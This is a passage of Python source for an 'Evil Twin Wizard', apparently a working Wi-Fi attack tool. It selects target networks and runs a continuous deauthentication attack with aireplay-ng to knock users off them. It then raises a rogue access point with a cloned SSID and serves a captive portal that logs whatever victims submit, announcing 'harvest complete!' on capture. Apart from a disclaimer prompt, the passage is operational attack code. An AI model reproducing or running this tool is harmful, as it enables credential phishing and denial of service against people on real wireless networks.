        logging.warning("Scan duration too short. Using 1 second.")
        scan_seconds = 1

    logging.info("")
    input(f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to scan networks on {ATTACK_INTERFACE}...")
    target_networks = select_networks(ATTACK_INTERFACE, scan_seconds)
    if not target_networks:
        logging.info(color_text("Aborted by user.", COLOR_STOP))
        return False
    logging.info("")
    logging.info(style("Targets selected:", STYLE_BOLD))
    for target in target_networks:
        logging.info("  - %s", format_target(target))

    ap_candidates = [iface for iface in interfaces if iface != ATTACK_INTERFACE]
    AP_INTERFACE = select_interface(ap_candidates, "Select AP interface")
    subprocess.run(["ip", "link", "set", AP_INTERFACE, "up"], stderr=subprocess.DEVNULL)

    AP_SSID = choose_ap_ssid(target_networks)
    os.makedirs(LOG_DIR, exist_ok=True)
    logging.info("")
    CAPTURE_FILE_PATH = os.path.join(LOG_DIR, sanitize_filename(AP_SSID))
    logging.info("Capturing portal submissions in: %s", CAPTURE_FILE_PATH)

    logging.info("")
    if not disclaimer_confirmed(AP_SSID, target_networks):
        logging.info(color_text("Aborted by user.", COLOR_STOP))
        return False

    PORTAL_HTML_PATH = select_portal_html_file()
    PORTAL_HTML = None
    logging.info("Selected portal file: %s", os.path.basename(PORTAL_HTML_PATH))

    primary_channel = target_networks[0].get("channel")
    if not is_monitor_mode(ATTACK_INTERFACE):
        logging.warning("Interface left monitor mode; re-enabling.")
        if not enable_monitor_mode(ATTACK_INTERFACE, primary_channel):
            return False

    logging.info("")
    input(
        f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to start Evil Twin for "
        f"{style(AP_SSID, COLOR_SUCCESS, STYLE_BOLD)}..."
    )

    if not start_deauth_attack(ATTACK_INTERFACE, target_networks):
        return False

    if not setup_ap():
        return False

    time.sleep(5)
    HTTP_SERVER = start_captive_portal()

    logging.info("")
    logging.info("=" * 50)
    logging.info(f"Evil Twin is {style('running', COLOR_RUNNING, STYLE_BOLD)}!")
    logging.info(f"AP SSID: {style(AP_SSID, COLOR_SUCCESS, STYLE_BOLD)}")
    logging.info("Targets:")
    for target in target_networks:
        logging.info("  - %s", format_target(target))
    logging.info("=" * 50)
    logging.info(
        "Press %s to %s",
        style("Ctrl+C", STYLE_BOLD),
        style("STOP the attack", COLOR_STOP, STYLE_BOLD),
    )

    processes = [HOSTAPD_PROC, DNSMASQ_PROC]

    restart_delay = 2
    try:
        while True:
            time.sleep(1)

            if DEAUTH_ACTIVE and (DEAUTH_THREAD is None or not DEAUTH_THREAD.is_alive()):
                DEAUTH_FAILURES += 1
                if DEAUTH_FAILURES > SILENT_INITIAL_DEAUTH_FAILURES:
                    logging.warning("Deauth worker stopped unexpectedly.")
                time.sleep(restart_delay)
                if not start_deauth_attack(ATTACK_INTERFACE, target_networks):
                    logging.error("Failed to restart deauth attack.")
                    return False

            if SUBMISSION_EVENT.is_set():
                with SUBMISSION_LOCK:
                    SUBMISSION_EVENT.clear()

                DEAUTH_ACTIVE = False
                stop_attack()
                shutdown_http_server()
                logging.info("")
                logging.info(style("harvest complete!", COLOR_SUCCESS, STYLE_BOLD))
                while True:
                    choice = input(
                        f"{style('Back to main menu', STYLE_BOLD)} (B) or {style('restart', STYLE_BOLD)} (R): "
                    ).strip().lower()
                    if choice in {"b", "back"}:
                        restart_requested = False
                        break
                    if choice in {"r", "restart"}:
                        restart_requested = True
                        break
                    logging.warning("Please enter B or R.")
                return restart_requested

            for i, proc in enumerate(processes):
                if proc and proc.poll() is not None:
                    logging.error(f"Process {i} died!")
                    return False
    except KeyboardInterrupt:
        logging.info(color_text("Stopping attack...", COLOR_STOP))
    finally:
        cleanup()

    return False


def main():
    logging.info(color_text("Evil Twin Wizard", COLOR_HEADER))
    logging.info("Starting Evil Twin System")
    logging.info("")

    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)

    required_tools = ["iw", "ip", "ethtool", "aireplay-ng", "hostapd", "dnsmasq", "iptables"]
    for tool in required_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
            logging.error("Required tool '%s' not found!", tool)
            sys.exit(1)

    import atexit
    atexit.register(cleanup)

    while True:
        restart = run_twins_session()
        if not restart:
            break
        logging.info(color_text("Restarting evil twin wizard...\n", COLOR_HEADER))


if __name__ == "__main__":
    main()
